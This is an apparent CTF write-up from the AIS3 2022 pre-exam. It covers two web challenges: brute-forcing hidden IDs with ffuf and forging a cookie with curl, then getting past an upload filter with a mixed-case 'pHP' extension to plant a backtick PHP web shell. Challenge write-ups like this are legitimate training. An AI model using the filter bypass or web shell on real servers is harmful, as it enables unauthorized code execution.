# AIS3-2022-Pre-exam-Writeup

- Team: `Ice1187`
- Ranking: 2nd

<img width="800" alt="ais3-pre-exam-scoreboard" src="https://user-images.githubusercontent.com/38059464/175545378-5b5f373e-7da8-4c96-b7d7-463e5a16caf5.png" >

## Web
### Poking Bear

1. 網頁上顯示的幾隻 bear 的 URL 為 `/bear/<n>`，因此猜測要找的 bear 應該也是同樣的格式。

2. 產生 `0` ~ `1000` 的 wordlist `bear.txt`，然後用 `ffuf` 進行爆搜，並將沒有 bear 的結果過濾掉。找到唯一不在網頁上的 bear `499` 為 secret bear。
```bash
$ ffuf -u http://chals1.ais3.org:8987/bear/FUZZ -w ./bear.txt | grep -v 'Size: 1358 ./fuzz_bear.txt
5                       [Status: 200, Size: 1742, Words: 295, Lines: 42]
29                      [Status: 200, Size: 1743, Words: 295, Lines: 42]
82                      [Status: 200, Size: 1743, Words: 295, Lines: 42]
327                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
350                     [Status: 200, Size: 1740, Words: 295, Lines: 42]
499                     [Status: 200, Size: 1847, Words: 335, Lines: 46]
777                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
999                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
```

3. 需要成為 `bear poker`，因此將 Cookie 的 `human` 設成 `bear poker`，再 poke 一次就拿到 flag。
```bash
$ curl http://chals1.ais3.org:8987/bear/499
Hello human, you need to be a "bear poker" to poke the SECRET BEAR.
$ curl http://chals1.ais3.org:8987/poke -H 'Cookie: human=bear poker' -d 'bear _id=499' -H 'Content-Type: application/x-www-form-urlencoded'
<script>alert(`AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}`); location='/'</script>
```

**Flag: `AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}`**

### Simple File Uploader

1. 不能上傳 `php`, `php2`, `php3`, `php4`, `php5`, `php6`, `phar`, `phtm`，可以用 `pHP` bypass 檢查。
2. Ban 掉一堆危險 function，可以用 `` ` `` 執行 shell command 讀取 flag。

```php
<?php
echo(`/rUn_M3_t0_9et_fL4g`);
?>
```

**Flag: 忘了留...**

### 

## Reverse


## Pwn


## Crypto


## Misc
